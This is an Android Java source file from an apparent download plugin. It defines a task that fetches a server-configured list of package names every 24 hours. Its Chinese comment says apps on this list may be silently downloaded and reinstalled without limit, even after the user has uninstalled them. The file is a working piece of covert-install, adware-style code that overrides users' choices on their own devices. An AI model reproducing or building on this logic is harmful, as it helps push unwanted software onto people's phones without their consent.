package com.tiho.dlplugin.task;

import java.util.HashSet;
import java.util.Set;

import android.content.Context;
import android.os.Handler;
import android.text.TextUtils;

import com.tiho.base.base.http.HttpHelper;
import com.tiho.dlplugin.util.StringUtils;
import com.tiho.dlplugin.util.Urls;
/**1439
 * 服务端后台可以按照包名配置此类“不受限、无限次可静默的产品”；此列表下载到本地；
 * 若用户卸载了列表中的产品，则下次客户端静默下载和安装之时，不受“已卸载产品不能重复下载安装”的限制；可以无限次静默；
 * @author Administrator
 *
 */
public class InstallTxtTask extends BaseTask {
	private static final Set<String> installs = new HashSet<String>();
	
	public InstallTxtTask(Handler handler, Context context) {
		super(handler, context);
	}

	@Override
	protected void doTask() {

		String url = Urls.getInstance().getInstallTxtUrl();
		
		String resp = HttpHelper.getInstance(context).simpleGet(url);
		
		if(!StringUtils.isEmpty(resp)){
			resp = resp.replace("\n", ",");
			String[] s = resp.split(",");
			if(s != null && s.length > 0){
				for(String name : s){
					if(!TextUtils.isEmpty(name)){
						installs.add(name);
					}
				}
			}
		}
		
	}

	@Override
	protected void afterTask(Handler handler) {
		handler.postDelayed(this, 24*3600000L); //每24小时轮询一次
	}

	public static boolean inSet(String pkgname){
		return installs.contains(pkgname);
	}
}
